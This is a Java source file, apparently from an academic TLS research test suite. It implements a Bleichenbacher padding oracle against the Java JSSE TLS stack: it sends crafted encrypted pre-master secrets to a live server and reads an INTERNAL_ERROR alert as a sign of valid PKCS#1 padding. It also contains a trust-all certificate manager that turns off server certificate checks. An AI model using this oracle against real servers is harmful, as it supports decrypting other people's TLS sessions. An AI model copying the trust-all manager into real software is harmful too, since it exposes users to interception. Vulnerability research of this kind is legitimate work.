package de.rub.nds.research.ssl.stack.tests.attacks.bleichenbacher.oracles;

import de.rub.nds.research.ssl.stack.protocols.alert.Alert;
import de.rub.nds.research.ssl.stack.protocols.alert.datatypes.EAlertDescription;
import de.rub.nds.research.ssl.stack.protocols.commons.EProtocolVersion;
import de.rub.nds.research.ssl.stack.protocols.commons.KeyExchangeParams;
import de.rub.nds.research.ssl.stack.protocols.handshake.ClientKeyExchange;
import de.rub.nds.research.ssl.stack.protocols.handshake.datatypes.EncryptedPreMasterSecret;
import de.rub.nds.research.ssl.stack.protocols.handshake.datatypes.PreMasterSecret;
import de.rub.nds.research.ssl.stack.tests.workflows.SSLHandshakeWorkflow;
import de.rub.nds.research.ssl.stack.tests.trace.Trace;
import de.rub.nds.research.ssl.stack.tests.workflows.ObservableBridge;
import java.io.IOException;
import java.net.ConnectException;
import java.security.GeneralSecurityException;
import java.security.PublicKey;
import java.security.cert.Certificate;
import java.security.cert.X509Certificate;
import java.security.interfaces.RSAPublicKey;
import java.util.ArrayList;
import java.util.List;
import java.util.Observable;
import java.util.Observer;
import javax.net.ssl.*;

/**
 * JSSE Bleichenbacher oracle - Alert:Internal_Error in special cases.
 * Conditions: keylength >= 2048bit and 0x00 byte in the padding String
 * (additional to the separation 0x00 byte) of the PKCS construct as part of the
 * ClientKeyExchange message.
 * 
 * Successfully tested on 
 * java version "1.6.0_20"
 * OpenJDK Runtime Environment (IcedTea6 1.9.13) (6b20-1.9.13-0ubuntu1~10.10.1)
 * OpenJDK 64-Bit Server VM (build 19.0-b09, mixed mode)
 *
 * @author Christopher Meyer - christopher.meyer@rub.de
 * @version 0.1
 *
 * May 18, 2012
 */
public class JSSEOracle extends AOracle implements Observer {

    /**
     * Handshake workflow to observe.
     */
    private SSLHandshakeWorkflow workflow;
    /**
     * TLS protocol version.
     */
    private EProtocolVersion protocolVersion = EProtocolVersion.TLS_1_0;
    private String host;
    private int port;
    private byte[] encPMStoCheck;
    private boolean oracleResult = false;

    public JSSEOracle(final String serverAddress, final int serverPort) {
        this.host = serverAddress;
        this.port = serverPort;
        workflow = new SSLHandshakeWorkflow(false);
        workflow.addObserver(this,
                SSLHandshakeWorkflow.EStates.CLIENT_KEY_EXCHANGE);
        workflow.addObserver(this, SSLHandshakeWorkflow.EStates.ALERT);
    }

    public static PublicKey fetchServerPublicKey(String serverHost,
            int serverPort) throws
            GeneralSecurityException, IOException {
        // everyone is our friend - let's trust the whole world
        TrustManager trustManager = new X509TrustManager() {

            public X509Certificate[] getAcceptedIssuers() {
                return null;
            }

            public void checkClientTrusted(X509Certificate[] certs,
                    String authType) {
            }

            public void checkServerTrusted(X509Certificate[] certs,
                    String authType) {
            }
        };

        // get a socket and extract the certificate
        SSLContext sc = SSLContext.getInstance("SSL");
        sc.init(null, new TrustManager[]{trustManager}, null);
        SSLSocketFactory sslSocketFactory = sc.getSocketFactory();
        SSLSocket sslSocket = (SSLSocket) sslSocketFactory.createSocket(
                serverHost, serverPort);
        sslSocket.setEnabledCipherSuites(buildRSACipherSuiteList(
                sslSocket.getEnabledCipherSuites()));
        sslSocket.startHandshake();
        SSLSession sslSession = sslSocket.getSession();
        Certificate[] peerCerts = sslSession.getPeerCertificates();

        return peerCerts[0].getPublicKey();
    }

    @Override
    public boolean checkPKCSConformity(final byte[] msg) {
        workflow.reset();
        workflow.connectToTestServer(this.host, this.port);

        numberOfQueries++;

        encPMStoCheck = msg;
        workflow.start();
        workflow.closeSocket();

        return oracleResult;
    }

    private int computeBlockSize() {
        byte[] tmp = ((RSAPublicKey) getPublicKey()).getModulus().toByteArray();
        int result = tmp.length;
        int remainder = tmp.length % 8;

        if (remainder > 0 && tmp[0] == 0x0) {
            // extract signing byte if present
            byte[] tmp2 = new byte[tmp.length - 1];
            System.arraycopy(tmp, 1, tmp2, 0, tmp2.length);
            tmp = tmp2;
            remainder = tmp.length % 8;
            result = tmp.length;
        }

        while (remainder > 0) {
            result++;
            remainder = result % 8;
        }

        return result;
    }

    @Override
    public int getBlockSize() {
        if(this.blockSize == 0) {
            this.blockSize = computeBlockSize();
        }
        
        return this.blockSize;
    }
    
    @Override
    public PublicKey getPublicKey() {
        if (this.publicKey == null) {
            try {
                this.publicKey = (RSAPublicKey) fetchServerPublicKey(this.host,
                        this.port);
            } catch (GeneralSecurityException ex) {
                ex.printStackTrace();
            } catch (ConnectException e) {
                e.printStackTrace();
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }

        return this.publicKey;
    }

    private static String[] buildRSACipherSuiteList(String[] suites) {
        List<String> cs = new ArrayList<String>(10);

        for (String suite : suites) {
            if (suite.contains("RSA")) {
                cs.add(suite);
            }
        }
        return cs.toArray(new String[cs.size()]);
    }

    /**
     * Update observed object.
     *
     * @param o Observed object
     * @param arg Arguments
     */
    @Override
    public void update(final Observable o, final Object arg) {
        Trace trace = null;
        SSLHandshakeWorkflow.EStates states = null;
        oracleResult = false;
        ObservableBridge obs;
        if (o != null && o instanceof ObservableBridge) {
            obs = (ObservableBridge) o;
            states = (SSLHandshakeWorkflow.EStates) obs.getState();
            trace = (Trace) arg;
        }
        if (states != null) {
            switch (states) {
                case CLIENT_KEY_EXCHANGE:
                    KeyExchangeParams keyParams =
                            KeyExchangeParams.getInstance();
                    PublicKey pk = keyParams.getPublicKey();
                    ClientKeyExchange cke = new ClientKeyExchange(
                            protocolVersion,
                            keyParams.getKeyExchangeAlgorithm());
                    PreMasterSecret pms = new PreMasterSecret(protocolVersion);
                    workflow.setPreMasterSecret(pms);
                    pms.setProtocolVersion(protocolVersion);
                    byte[] encodedPMS = pms.encode(false);

                    //encrypt the PreMasterSecret
                    EncryptedPreMasterSecret encPMS =
                            new EncryptedPreMasterSecret(pk);
                    encPMS.setEncryptedPreMasterSecret(encPMStoCheck);
                    cke.setExchangeKeys(encPMS);

                    trace.setCurrentRecord(cke);
                    break;
                case ALERT:
                    Alert alert = new Alert(trace.getCurrentRecord().
                            encode(false), false);

                    if (EAlertDescription.INTERNAL_ERROR.equals(alert.
                            getAlertDescription())) {
                        oracleResult = true;
                    }
                    break;
                default:
                    break;
            }
        }
    }
}
